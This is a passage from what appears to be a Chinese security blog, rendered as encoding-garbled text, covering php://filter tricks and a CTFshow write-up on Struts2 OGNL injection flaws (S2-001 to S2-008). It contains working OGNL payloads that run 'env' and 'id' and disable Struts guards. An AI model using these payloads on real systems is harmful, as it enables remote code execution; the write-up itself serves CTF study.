php://filter\n\næœ€èƒ½ç©å‡ºèŠ±æ¥çš„ä¸€ä¸ªåè®®ï¼Œæœ€åŸºç¡€çš„å½“ç„¶æ˜¯base64è¯»å–äº†\n\n```\nphp://filter/convert.base64-encode/resource=xxx.php\n```\n\nä¸­é—´convertå¯ç”¨çš„å†…å®¹æœ‰\n\n```\nconvert.quoted-printable-encode\tå°†æ–‡æœ¬ä¸­çš„ä¸å¯è§å­—ç¬¦è½¬æ¢ä¸ºå¯æ‰“å°çš„å­—ç¬¦è¿›è¡Œè¾“å‡º\nconvert.quoted-printable-decode ä¸Šè¿°é€†è¿‡ç¨‹\n```\n\nè¯´å®è¯è¿˜æ²¡æ€ä¹ˆè§è¿‡è¿™ä¸ªç”¨æ³•ï¼Œ~~å€’ä¹Ÿç¡®å®æ²¡å•¥åµç”¨~~\n\nå…¶ä¸­å¯ç”¨çš„æœ€å¤šçš„å°±æ˜¯è¿™ä¸ª\n\n```\nconvert.iconv.<input-encoding>.<output-encoding>\n```\n\nè¿™ä¸ªè½¬æ¢å™¨å¯ä»¥å°†å†…å®¹ä»ä»»æ„ä¸€ä¸ªç¼–ç è½¬æ¢ä¸ºå¦ä¸€ç§ç¼–ç ï¼Œhttps://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## æ–‡ä»¶ä¸Šä¼ \n\n"},{"title":"CTFshowJava","url":"/posts/efe011ec.html","content":"\n# CTFshow Java\n\nå…¨éƒ¨é¢˜éƒ½æ˜¯struts2[æ¡†æ¶](https://so.csdn.net/so/search?q=æ¡†æ¶&spm=1001.2101.3001.7020)æ¼æ´\n\nStruts2æ˜¯ç”¨Javaè¯­è¨€ç¼–å†™çš„ä¸€ä¸ªåŸºäº[MVC](https://so.csdn.net/so/search?q=MVC&spm=1001.2101.3001.7020)è®¾è®¡æ¨¡å¼çš„Webåº”ç”¨æ¡†æ¶\n\næ³¨æ„ä»¥ä¸‹æ‰€æœ‰æ¼æ´éƒ½å¯ä»¥ç›´æ¥åˆ©ç”¨å…¬å¼€çš„è„šæœ¬è¿›è¡Œä¸€é”®åˆ©ç”¨\n\né¦–å…ˆè¦äº†è§£ä¸€ä¸‹OGNLä¸­çš„ç‰¹æ®Šç¬¦å·ä½œç”¨\n\n> - `%`çš„ç”¨é€”æ˜¯åœ¨æ ‡å¿—çš„å±æ€§ä¸ºå­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œè®¡ç®—OGNLè¡¨è¾¾å¼%{}ä¸­çš„å€¼\n> - `#`çš„ç”¨é€”è®¿ä¸»è¦æ˜¯è®¿é—®éæ ¹å¯¹è±¡å±æ€§ï¼Œå› ä¸ºStruts 2ä¸­å€¼æ ˆè¢«è§†ä¸ºæ ¹å¯¹è±¡ï¼Œæ‰€ä»¥è®¿é—®å…¶ä»–éæ ¹å¯¹è±¡æ—¶ï¼Œéœ€è¦åŠ #å‰ç¼€æ‰å¯ä»¥è°ƒç”¨\n> - `$`ä¸»è¦æ˜¯åœ¨Struts 2é…ç½®æ–‡ä»¶ä¸­ï¼Œå¼•ç”¨OGNLè¡¨è¾¾å¼\n\nå…³äºOGNLè¯­è¨€çš„ä»‹ç»å¯ä»¥çœ‹[è¿™é‡Œ](https://jueee.github.io/2020/08/2020-08-15-Ognlè¡¨è¾¾å¼çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•/)ï¼Œåœ¨è¿™é‡Œå¯ä»¥è¿›è¡Œåˆ©ç”¨æ˜¯å› ä¸ºstrutså°†å…¶ä½œä¸ºé»˜è®¤è¯­è¨€\n\nåˆ¤æ–­é¡µé¢æ˜¯å¦åŸºäºStruts2ï¼š\n\n- é€šè¿‡é¡µé¢å›æ˜¾çš„é”™è¯¯æ¶ˆæ¯æ¥åˆ¤æ–­ï¼Œé¡µé¢ä¸å›æ˜¾é”™è¯¯æ¶ˆæ¯æ—¶åˆ™æ— æ•ˆ\n- é€šè¿‡ç½‘é¡µåç¼€æ¥åˆ¤æ–­ï¼Œå¦‚.do .actionï¼Œæœ‰å¯èƒ½ä¸å‡†\n  - å¦‚æœé…ç½®æ–‡ä»¶ä¸­å¸¸æ•°extensionçš„å€¼ä»¥é€—å·ç»“å°¾æˆ–è€…æœ‰ç©ºå€¼ï¼ŒæŒ‡æ˜äº†actionå¯ä»¥ä¸å¸¦åç¼€ï¼Œé‚£ä¹ˆä¸å¸¦åç¼€çš„uriä¹Ÿå¯èƒ½æ˜¯struts2æ¡†æ¶æ­å»ºçš„\n  - å¦‚æœä½¿ç”¨Struts2çš„restæ’ä»¶ï¼Œå…¶é»˜è®¤çš„struts-plugin.xmlæŒ‡å®šçš„è¯·æ±‚åç¼€ä¸ºxhtml,xmlå’Œjson\n- åˆ¤æ–­ /struts/webconsole.html æ˜¯å¦å­˜åœ¨æ¥è¿›è¡Œåˆ¤æ–­ï¼Œéœ€è¦ devMode ä¸º true\n\n[è„šæœ¬é“¾æ¥](https://github.com/HatBoy/Struts2-Scan)\n\n## ValueStack\n\nåé¢ä¼šé«˜é¢‘å‡ºç°çš„ä¸€ä¸ªä¸œè¥¿ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\né¦–å…ˆStruts2çš„è¿è¡Œæµç¨‹æ˜¯ï¼ˆåé¢çš„å¾ˆå¤šä¸œè¥¿éƒ½æ˜¯åŸºäºè¿™ä¸ªæµç¨‹åˆ†æçš„ï¼‰\n\n![æµç¨‹å›¾](https://taomujian.github.io/img/S2-008/images/%E6%B5%81%E7%A8%8B%E5%9B%BE.png)\n\n1. HTTPè¯·æ±‚ç»è¿‡ä¸€ç³»åˆ—çš„æ ‡å‡†è¿‡æ»¤å™¨(Filter)ç»„ä»¶é“¾(è¿™äº›æ‹¦æˆªå™¨å¯ä»¥æ˜¯Struts2 è‡ªå¸¦çš„,ä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„,æœ¬ç¯å¢ƒä¸­struts.xmlä¸­çš„packageç»§æ‰¿è‡ªstruts-default,struts-defaultå°±ä½¿ç”¨äº†Struts2è‡ªå¸¦çš„æ‹¦æˆªå™¨.ActionContextCleanUpä¸»è¦æ˜¯æ¸…ç†å½“å‰çº¿ç¨‹çš„ActionContextã€Dispatcher,FilterDispatcherä¸»è¦æ˜¯é€šè¿‡ActionMapperæ¥å†³å®šéœ€è¦è°ƒç”¨é‚£ä¸ªAction,FilterDispatcheræ˜¯æ§åˆ¶å™¨çš„æ ¸å¿ƒ,ä¹Ÿæ˜¯MVCä¸­æ§åˆ¶å±‚çš„æ ¸å¿ƒç»„ä»¶),æœ€ååˆ°è¾¾FilterDispatcherè¿‡æ»¤å™¨.\n\n2. æ ¸å¿ƒæ§åˆ¶å™¨ç»„ä»¶FilterDispatcheræ ¹æ®ActionMapperä¸­çš„è®¾ç½®ç¡®å®šæ˜¯å¦éœ€è¦è°ƒç”¨æŸä¸ªActionç»„ä»¶æ¥å¤„ç†è¿™ä¸ªHttpServletRequestè¯·æ±‚,å¦‚æœActionMapperå†³å®šè°ƒç”¨æŸä¸ªActionç»„ä»¶,FilterDispatcheræ ¸å¿ƒæ§åˆ¶å™¨ç»„ä»¶å°±ä¼šæŠŠè¯·æ±‚çš„å¤„ç†æƒå§”æ‰˜ç»™ActionProxyç»„ä»¶.\n\n3. ActionProxyç»„ä»¶é€šè¿‡Configuration Managerç»„ä»¶è·å–Struts2æ¡†æ¶çš„é…ç½®æ–‡ä»¶struts.xml,æœ€åæ‰¾åˆ°éœ€è¦è°ƒç”¨çš„ç›®æ ‡Actionç»„ä»¶ç±»,ç„¶åActionProxyç»„ä»¶å°±åˆ›å»ºå‡ºä¸€ä¸ªå®ç°äº†å‘½ä»¤æ¨¡å¼çš„ActionInvocationç±»çš„å¯¹è±¡å®ä¾‹ç±»çš„å¯¹è±¡å®ä¾‹(è¿™ä¸ªè¿‡ç¨‹åŒ…æ‹¬è°ƒç”¨Anctionç»„ä»¶æœ¬èº«ä¹‹å‰è°ƒç”¨å¤šä¸ªçš„æ‹¦æˆªå™¨ç»„ä»¶çš„before()æ–¹æ³•)åŒæ—¶ActionInvocationç»„ä»¶é€šè¿‡ä»£ç†æ¨¡å¼è°ƒç”¨ç›®æ ‡Actionç»„ä»¶.ä½†æ˜¯åœ¨è°ƒç”¨ä¹‹å‰ActionInvocationç»„ä»¶ä¼šæ ¹æ®é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®é¡¹ç›®åŠ è½½ä¸ç›®æ ‡Actionç»„ä»¶ç›¸å…³çš„æ‰€æœ‰æ‹¦æˆªå™¨ç»„ä»¶(Interceptor)\n\n4. ä¸€æ—¦Actionç»„ä»¶æ‰§è¡Œå®Œæ¯•,ActionInvocationç»„ä»¶å°†æ ¹æ®å¼€å‘äººå‘˜åœ¨Struts2.xmlé…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„å„ä¸ªé…ç½®é¡¹ç›®è·å¾—å¯¹è±¡çš„è¿”å›ç»“æœ,è¿™ä¸ªè¿”å›ç»“æœæ˜¯è¿™ä¸ªActionç»„ä»¶çš„ç»“æœç (æ¯”å¦‚SUCCESSã€INPUT),ç„¶åæ ¹æ®è¿”å›çš„è¯¥ç»“æœè°ƒç”¨ç›®æ ‡JSPé¡µé¢ä»¥å®ç°æ˜¾ç¤ºè¾“å‡º.\n\n5. æœ€åå„ä¸ªæ‹¦æˆªå™¨ç»„ä»¶ä¼šè¢«å†æ¬¡æ‰§è¡Œ(ä½†æ˜¯é¡ºåºå’Œå¼€å§‹æ—¶ç›¸å,å¹¶è°ƒç”¨after()æ–¹æ³•),ç„¶åè¯·æ±‚æœ€ç»ˆè¢«è¿”å›ç»™ç³»ç»Ÿçš„éƒ¨ç½²æ–‡ä»¶ä¸­é…ç½®çš„å…¶ä»–è¿‡æ»¤å™¨,å¦‚æœå·²ç»è®¾ç½®äº†ActionContextCleanUpè¿‡æ»¤å™¨,é‚£ä¹ˆFilterDispatcherå°±ä¸ä¼šæ¸…ç†åœ¨ThreadLocalå¯¹è±¡ä¸­ä¿å­˜çš„ActionContextä¿¡æ¯.å¦‚æœæ²¡æœ‰è®¾ç½®ActionContextCleanUpè¿‡æ»¤å™¨,FilterDispatcherå°±ä¼šæ¸…é™¤æ‰æ‰€æœ‰çš„ThreadLocalå¯¹è±¡.\n\n## 279\n\næ¼æ´ï¼šS2-001\n\næ¼æ´æˆå› ï¼šå½“ç”¨æˆ·æäº¤è¡¨å•æ•°æ®ä¸”éªŒè¯å¤±è´¥æ—¶ï¼ŒæœåŠ¡å™¨ä½¿ç”¨OGNLè¡¨è¾¾å¼è§£æç”¨æˆ·å…ˆå‰æäº¤çš„å‚æ•°å€¼ï¼Œ%{value}å¹¶é‡æ–°å¡«å……ç›¸åº”çš„è¡¨å•æ•°æ®\n\nå½±å“ç‰ˆæœ¬ï¼šWebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8\n\næ¼æ´åˆ†æï¼š\n\n1. é¦–å…ˆæ–­ç‚¹æ‰“åœ¨æ¥å—å‚æ•°å¹¶éªŒè¯çš„åœ°æ–¹ï¼Œè¿›è€Œè·Ÿè¿›è§¦å‘ç‚¹![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100121467.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100124296.png)\n\n2. ç”±äºéªŒè¯å¤±è´¥å¯¼è‡´è¿”å›errorè¿›è¡Œæ¸²æŸ“ï¼ŒæŸ¥çœ‹å¯¹`<s:textfield>`æ ‡ç­¾çš„æ¸²æŸ“è§„åˆ™\n\n   > jspæ–‡ä»¶ä¸­é‡åˆ°Struts2æ ‡ç­¾ <s:textfield æ—¶ç¨‹åºä¼šå…ˆè°ƒç”¨ doStartTag,å¹¶å°†æ ‡ç­¾ä¸­çš„å±æ€§è®¾ç½®åˆ°TextFieldTagå¯¹è±¡ç›¸åº”å±æ€§ä¸­.åœ¨é‡åˆ° /> ç»“æŸæ ‡ç­¾çš„æ—¶å€™è°ƒç”¨doEndTagæ–¹æ³•\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100126720.png)\n\n3. ç›´æ¥åœ¨æ¸²æŸ“å‡½æ•°å¤„æ‰“æ–­ç‚¹ï¼Œåœ¨`org.apache.struts2.views.jsp.ComponentTagSupport`ä¸­æ‰¾åˆ°ä¸Šè¿°æåˆ°çš„ä¸¤ä¸ªå‡½æ•°![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100129583.png)\n\n4. è·Ÿè¿›endæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›evaluateParamsæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°åœ¨è¿™ä¸ªæ–¹æ³•ä¸­å¦‚æœå¼€å¯äº†altSyntaxï¼Œé‚£ä¹ˆå°±ä¼šåœ¨nameå±æ€§çš„å­—æ®µä¸¤è¾¹æ·»åŠ OGNLè¡¨è¾¾å¼å­—ç¬¦ç”Ÿæˆexprå±æ€§ï¼Œæ­¥è¿‡æ‰§è¡Œå‘ç°exprå†…å®¹ç¡®å®è¢«æ”¹å˜![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100134657.png)\n\n5. ç»§ç»­è·Ÿè¿›findValueæ–¹æ³•ï¼Œåœ¨è¿™é‡Œå°±èƒ½çœ‹åˆ°å‡ºé—®é¢˜çš„ç‚¹äº†ï¼Œå°±æ˜¯translateVariablesæ–¹æ³•![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100141364.png)\n\n6. æ­¥å…¥åå‘ç°å…¶åˆè°ƒç”¨äº†åŒåé‡è½½æ–¹æ³•ï¼Œç›´æ¥çœ‹é‡è½½åçš„å‡½æ•°å†…å®¹![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100144830.png)\n\n   > ç¬¬ä¸€æ¬¡è·å–oçš„å€¼,è¿™é‡Œçš„stackä¸ºOgnlValueStack,å®ƒæ˜¯ValueStackçš„å®ç°ç±».ValueStackæ˜¯Struts2çš„ä¸€ä¸ªæ¥å£,è¡¨é¢æ„ä¹‰ä¸ºå€¼æ ˆ,ç±»ä¼¼äºä¸€ä¸ªæ•°æ®ä¸­è½¬ç«™,Struts2çš„æ•°æ®éƒ½ä¼šä¿å­˜åœ¨ValueStackä¸­.Struts2åœ¨å‘èµ·è¯·æ±‚åˆ›å»ºActionå®ä¾‹çš„åŒæ—¶ä¼šåˆ›å»ºä¸€ä¸ªOgnlValueStackå€¼æ ˆå®ä¾‹.Struts2ä½¿ç”¨OGNLå°†è¯·æ±‚Actionçš„å‚æ•°å°è£…ä¸ºå¯¹è±¡å­˜å‚¨åˆ°å€¼æ ˆä¸­,å¹¶é€šè¿‡OGNLè¡¨è¾¾å¼è¯»å–å€¼æ ˆä¸­çš„å¯¹è±¡å±æ€§å€¼.\n   >\n   > ValueStackä¸­æœ‰ä¸¤ä¸ªä¸»è¦åŒºåŸŸ:\n   >\n   > â€‹\tCompoundRootåŒºåŸŸ:æ˜¯ä¸€ä¸ªArrayList,å­˜å‚¨äº†Actionå®ä¾‹,å®ƒä½œä¸ºOgnlContextçš„Rootå¯¹è±¡.è·å–rootæ•°æ®ä¸éœ€è¦åŠ #\n   >\n   > â€‹\tcontextåŒºåŸŸ:å³OgnlContextä¸Šä¸‹æ–‡,æ˜¯ä¸€ä¸ªMap,æ”¾ç½®webå¼€å‘å¸¸ç”¨çš„å¯¹è±¡æ•°æ®çš„å¼•ç”¨.requestã€sessionã€parametersã€applicationç­‰.è·å–contextæ•°æ®éœ€è¦åŠ #\n   >\n   > æ“ä½œå€¼æ ˆ,é€šå¸¸æŒ‡çš„æ˜¯æ“ä½œValueStackä¸­çš„rootåŒºåŸŸ.\n   >\n   > OgnlValueStackçš„findValueæ–¹æ³•å¯ä»¥åœ¨CompoundRootä¸­ä»æ ˆé¡¶å‘æ ˆåº•æ‰¾æŸ¥æ‰¾å¯¹è±¡çš„å±æ€§å€¼\n\n   ä»¥ä¸Šä¸ºå¤§ä½¬è§£æçš„stackå˜é‡çš„å†…å®¹ï¼Œä¸ç®¡å¦‚ä½•ï¼Œæˆ‘ä»¬ç›´æ¥è·Ÿè¿›åˆ°55è¡Œçš„stackçš„findValueæ–¹æ³•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¼ å…¥çš„å‚æ•°å†…å®¹![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100206870.png)ç»§ç»­æ­¥å…¥åˆ°`OgnlUtil.getValue`æ–¹æ³•ä¸­ï¼Œç»§ç»­æ­¥å…¥åˆ°`Ognl.getValue`æ–¹æ³•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶å¯¹nameå‚æ•°è¿›è¡Œäº†compileæ“ä½œå¹¶è¿”å›ä¼ å…¥çš„getValueæ–¹æ³•ï¼Œå°†usernameä¸­çš„å†…å®¹å–å‡ºå¹¶æ‰§è¡Œå…¶ä¸­çš„OGNLè¡¨è¾¾å¼![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100215156.png)å¦‚æ­¤åå¤å¯ä»¥çœ‹åˆ°æœ€åOGNLè¡¨è¾¾å¼è¢«æˆåŠŸæ‰§è¡Œå¹¶ä¸”ç»“æœå­˜å…¥äº†resultä¸­![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100215768.png)\n\npayloadï¼š\n\n```java\n// è·å–tomcatè·¯å¾„\n%{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"}\n\n// è·å–webè·¯å¾„\n%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}\n\n// å‘½ä»¤æ‰§è¡Œ envï¼Œflagå°±åœ¨å…¶ä¸­\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"env\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n```\n\n## 280\n\næ¼æ´ï¼šS2-003 S2-005 *CVE-2008-6504*\n\næ¼æ´æˆå› ï¼š\n\n- S2-003æˆå› æ˜¯Struts2å°†HTTPçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºognlè¯­å¥æ‰§è¡Œï¼Œè€Œognlè¡¨è¾¾å¼æ˜¯é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼ŒStruts2æ¡†æ¶è™½ç„¶è¿‡æ»¤äº†#æ¥è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡unicodeç¼–ç ï¼ˆu0023ï¼‰æˆ–8è¿›åˆ¶ï¼ˆ43ï¼‰ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œè¾¾åˆ°ä»£ç æ‰§è¡Œçš„æ•ˆæœ\n- S2-005çš„åŸç†å’ŒS2-003åŸºæœ¬ç›¸ä¼¼ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥ç»•è¿‡å®˜æ–¹çš„å®‰å…¨é…ç½®ï¼ˆç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œï¼‰ï¼Œå†æ¬¡é€ æˆçš„æ¼æ´ï¼Œå¯ä»¥è¯´æ˜¯å‡çº§ç‰ˆçš„S2-005æ˜¯å‡çº§ç‰ˆçš„S2-003\n\nå½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.1.8.1\n\næ¼æ´åˆ†æï¼š\n\n1. é¦–å…ˆè§¦å‘ç‚¹`com.opensymphony.xwork2.interceptor.ParametersInterceptor`ï¼Œå¯ä»¥çœ‹åˆ°é»˜è®¤çš„`denyMethodExecution`å€¼æ˜¯trueï¼Œæ”¹ä¸ºfalseæ‰èƒ½ç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥payloadä¸­éƒ¨åˆ†å†…å®¹æ˜¯è¦å°†å…¶æ”¹ä¸ºfalseçš„![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111446997.png)\n2. æŸ¥çœ‹æ‰§è¡Œpayloadåå…¶ä¸­è·å–çš„å‚æ•°![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111447204.png)\n3. æ­¥å…¥setParameterså‡½æ•°ï¼Œå‡½æ•°é€šè¿‡è¿­ä»£å™¨å°†å‚æ•°é€ä¸ªå–å‡º![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111450215.png)\n4. æ­¥å…¥acceptableNameå‡½æ•°ï¼Œç»§ç»­æ­¥å…¥isAcceptedå‡½æ•°![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111455764.png)\n5. å¯ä»¥çœ‹åˆ°æ­¤å¤„çš„æ­£åˆ™è¡¨è¾¾å¼åªæ˜¯ç®€å•çš„å¯¹#è¿›è¡Œäº†è¿‡æ»¤å¹¶æ²¡æœ‰è¿‡æ»¤unicodeå­—ç¬¦ï¼Œæœ€ç»ˆæ‰§è¡Œç»“æŸè¿”å›å­—ç¬¦ä¸²ä½¿å¾—åˆ¤å®šä¸ºçœŸ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111501736.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111459231.png)\n6. ä¸‹ä¸€æ­¥ç»§ç»­è·Ÿè¿›stackçš„setValueæ–¹æ³•![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111556550.png)\n7. å‘ç°å…¶åˆè°ƒç”¨äº†åŒåçš„é‡è½½æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›`OgnlUtil.setValue`![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111605549.png)\n8. è·Ÿå…¥compileæ–¹æ³•ï¼Œç»§ç»­è·Ÿå…¥parseExpressionæ–¹æ³•ï¼Œç»§ç»­è·Ÿå…¥topLevelExpressionæ–¹æ³•ï¼Œç»§ç»­è¿›å…¥expressionï¼Œç»è¿‡ä¸€ç³»åˆ—æ“ä½œåæœ€ç»ˆè§£æåˆ°`ognl.JavaCharStream#readChar`å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111607140.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111610477.png)\n9. å¯ä»¥çœ‹åˆ°å…¶å¯¹\\uç±»å‹çš„å­—ç¬¦è¿›è¡Œäº†ä¸“é—¨çš„è§£æï¼Œå°†å…¶è½¬åŒ–ä¸ºæ­£å¸¸å­—ç¬¦ï¼Œå¯¼è‡´OGNLè¡¨è¾¾å¼æ‰§è¡Œ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111615029.png)\n\n## 281\n\næ¼æ´ï¼šS2-007 *CVE-2012-0838*\n\næ¼æ´æˆå› ï¼šåœ¨Struts2ä¸­,å¯ä»¥å°†HTTPè¯·æ±‚æ•°æ®æ³¨å…¥åˆ°å®é™…ä¸šåŠ¡Actionçš„å±æ€§ä¸­,è¿™äº›å±æ€§å¯ä»¥æ˜¯ä»»æ„ç±»å‹çš„æ•°æ®,é€šè¿‡HTTPåªèƒ½è·å–åˆ°Stringç±»å‹æ•°æ®,Struts2ä¸­é»˜è®¤æœ‰ä¸€ä¸ªç±»å‹è½¬æ¢å™¨,å¯ä»¥å®Œæˆå¤§éƒ¨åˆ†çš„è‡ªåŠ¨è½¬æ¢æ“ä½œ,å¯ä»¥é€šè¿‡xmlæ–‡ä»¶,æ¥å®šä¹‰è½¬æ¢è§„åˆ™.æ¯”å¦‚Actionç±»ä¸­æœ‰ä¸€ä¸ªintegerå±æ€§,ä¸éœ€è¦æ‰§è¡Œä»»ä½•æ“ä½œ,Strutsä¼šè‡ªåŠ¨å°†è¯·æ±‚å‚æ•°è½¬æ¢ä¸ºintegerå±æ€§.å½“é…ç½®äº†Validationæ—¶,è‹¥ç±»å‹è½¬æ¢å‡ºé”™,åç«¯é»˜è®¤ä¼šå°†ç”¨æˆ·æäº¤çš„è¡¨å•å€¼é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥,ç„¶åæ‰§è¡Œä¸€æ¬¡OGNLè¡¨è¾¾å¼è§£æå¹¶è¿”å›,ä»è€Œå¯ä»¥æ„é€ ç‰¹æ®Šçš„æ¶æ„è¯·æ±‚æ¥æ‰§è¡Œå‘½ä»¤.è¿™ç§åˆ©ç”¨æ–¹å¼å’ŒS2-001çš„å¾ˆç›¸ä¼¼,ä¸åŒçš„æ˜¯åˆ©ç”¨ç‚¹ä¸åŒ.\n\nå½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.2.3\n\næ¼æ´åˆ†æï¼š\n\n1. é¦–å…ˆçœ‹demoä¸­å¯¹Struts2çš„é»˜è®¤ç±»å‹è½¬æ¢å™¨çš„è°ƒç”¨ï¼Œå…¶é€šè¿‡xmlæ–‡ä»¶æ¥å®šä¹‰è½¬æ¢è§„åˆ™ï¼Œåœ¨ç¯å¢ƒç»™äºˆçš„demoä¸­å°±å°†ageè½¬æ¢ä¸ºintç±»å‹ï¼ŒèŒƒå›´åœ¨1-100![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141518983.png)\n2. å…·ä½“æ¼æ´è§¦å‘ç‚¹å°±åœ¨`com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor`ä¸­ï¼Œå…ˆåœ¨å¯¹åº”ä½ç½®æ‰“å¥½æ–­ç‚¹ï¼Œç„¶åå‘èµ·è¯·æ±‚ï¼Œå°†payloadæ”¾å…¥![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141522934.png)\n3. å¯ä»¥çœ‹åˆ°æ­¤å¤„çš„ä»£ç å°†è½¬æ¢å‡ºé—®é¢˜çš„å†…å®¹æ”¾å…¥äº†`conversionErrors`å˜é‡ä¸­ï¼Œå¹¶åœ¨i$è¿­ä»£å™¨ä¸­å¾ªç¯å°†å±æ€§åèµ‹å€¼ç»™propertyNameï¼Œå±æ€§å€¼èµ‹å€¼ç»™value![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141530747.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141534846.png)\n4. æœ€åå¯¹fakieè¿›è¡Œçš„putæ“ä½œï¼Œæˆ‘ä»¬è·Ÿè¿›`getOverrideExpr`æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å¯¹valueè¿›è¡Œå¤„ç†æ—¶å¯¹å­—ç¬¦ä¸²å‰ååˆ†åˆ«æ·»åŠ äº†ä¸€ä¸ªå•å¼•å·ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬çš„payloadæ˜¯è¿™ç§æ ¼å¼çš„åŸå› ï¼Œ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141539863.png)\n5. æœ€ç»ˆèµ°å…¥OgnlValueStackçš„setExprOverridesæ–¹æ³•ï¼Œå°†fakieèµ‹å€¼ç»™overrideså±æ€§![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141547096.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141545456.png)\n6. å½“æ‹¦æˆªå™¨æ‰§è¡Œç»“æŸåä¼šå°†jspå†…å®¹è¿›è¡Œè§£æï¼Œä¼šä»OgnlValueStackçš„overrideså±æ€§ä¸­å¯»æ‰¾keyä¸ºageçš„é”®å€¼å¯¹å¹¶æ‰§è¡Œognlè¡¨è¾¾å¼\n\npayload:\n\n```\n' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '\n```\n\n## 282\n\næ¼æ´ï¼šS2-008 *CVE-2012-0391*\n\næ¼æ´æˆå› ï¼šStruts2æ¡†æ¶å­˜åœ¨ä¸€ä¸ªdevmodeæ¨¡å¼,å½“devmodeæ¨¡å¼å¼€å¯æ—¶,Struts2å¯¹ä¼ å…¥çš„å‚æ•°æ²¡æœ‰ä¸¥æ ¼é™åˆ¶,å¯¼è‡´å¤šä¸ªåœ°æ–¹å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç \n\nå½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.17\n\næ¼æ´åˆ†æï¼š\n\n1. é¦–å…ˆçœ‹å‡ºå‘ç‚¹ä½ç½®åœ¨`org.apache.struts2.interceptor.debugging.DebuggingInterceptor`ï¼Œåœ¨ç¬¬95è¡Œå¤„æ‰“æ–­ç‚¹ï¼Œè·å–åˆ°debugçš„å€¼ä¸ºcommandï¼Œè¿›å…¥else ifçš„åˆ¤æ–­ï¼ŒæŸ¥çœ‹å†…å®¹![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100057285.png)\n2. å¯ä»¥çœ‹åˆ°è¿›å…¥äº†else ifçš„åˆ¤æ–­åå°†expressionä¼ 